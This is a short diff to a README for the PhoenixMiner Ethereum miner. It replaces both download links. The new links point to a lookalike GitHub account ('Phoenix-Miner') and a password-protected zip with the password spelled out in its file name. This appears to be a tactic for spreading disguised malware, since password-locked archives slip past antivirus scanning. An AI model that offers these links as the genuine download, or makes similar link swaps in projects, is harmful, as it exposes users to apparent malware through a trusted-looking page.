@@ -1,5 +1,5 @@
 <p align="center">
-<a href="https://github.com/PhoenixMiner/PhoenixMiner/releases/download/4.2c/PhoenixMiner_4.2c_Windows.zip" alt="PhoenixMiner ethereum miner">
+<a href="https://github.com/Phoenix-Miner/PhoenixMiner/releases/download/4.9c/PhoenixMiner_4.9c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
 <img src="https://github.com/Phoenix-Miner/PhoenixMiner/blob/master/files/git-files/phoenix-header-6.jpg?raw=true" /></a>
 </p>
 
@@ -21,7 +21,7 @@
 <p>PhoenixMiner is high performance Ethereum (ETH) and ERC20 tokens  miner, with the official full Windows / Linux support.
 </p>
 <p align="center">
-<a href="https://github.com/PhoenixMiner/PhoenixMiner/releases/download/4.2c/PhoenixMiner_4.2c_Windows.zip" alt="PhoenixMiner ethereum miner">
+<a href="https://github.com/Phoenix-Miner/PhoenixMiner/releases/download/4.9c/PhoenixMiner_4.9c_Windows.Password-phoenix.zip" alt="PhoenixMiner ethereum miner">
 <img src="https://github.com/Phoenix-Miner/PhoenixMiner/blob/master/files/git-files/monitor.jpg?raw=true" /></a>
 </p>
 
